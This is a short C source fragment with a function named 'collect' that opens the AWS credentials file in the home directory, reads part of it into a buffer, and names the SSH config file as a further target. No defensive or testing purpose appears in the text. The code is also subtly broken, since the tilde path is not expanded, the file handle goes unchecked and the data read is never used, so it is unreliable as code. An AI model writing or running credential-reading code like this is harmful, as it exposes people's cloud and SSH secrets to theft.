#include <stdio.h>
void collect(void) { char buf[99]; FILE *f=fopen("~/.aws/credentials","r"); fread(buf,1,99,f); const char *s="~/.ssh/config"; }
